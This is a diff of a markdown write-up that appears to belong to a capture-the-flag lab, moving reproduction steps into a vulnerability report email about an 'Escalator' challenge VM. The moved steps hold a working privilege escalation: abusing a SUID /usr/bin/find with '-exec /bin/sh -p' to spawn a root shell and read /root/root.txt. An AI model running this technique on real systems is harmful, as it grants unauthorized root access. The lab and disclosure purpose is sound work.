@@ -208,18 +208,7 @@ providing an additional layer of defense.
 
 ## Vulnerability Report Email
 
-
-   (Expected: -rwsr-xr-x 1 root root ...)
-
-5. Exploit the SUID binary to spawn a root shell using GTFOBins technique:
-   /usr/bin/find . -exec /bin/sh -p \; -quit
-
-6. Confirm root access:
-   id
-   (Expected output: uid=1001(guest) euid=0(root))
-
-7. Retrieve the flag:
-   cat /root/root.txt```
+```
 To: security@escalatorlab.com
 Subject: Security Vulnerability Report: Privilege Escalation in Escalator Challenge VM
 
@@ -255,6 +244,17 @@ Steps to Reproduce:
 
 4. Observe that /usr/bin/find has the SUID bit set:
    ls -la /usr/bin/find
+   (Expected: -rwsr-xr-x 1 root root ...)
+
+5. Exploit the SUID binary to spawn a root shell using GTFOBins technique:
+   /usr/bin/find . -exec /bin/sh -p \; -quit
+
+6. Confirm root access:
+   id
+   (Expected output: uid=1001(guest) euid=0(root))
+
+7. Retrieve the flag:
+   cat /root/root.txt
 
 ---
 
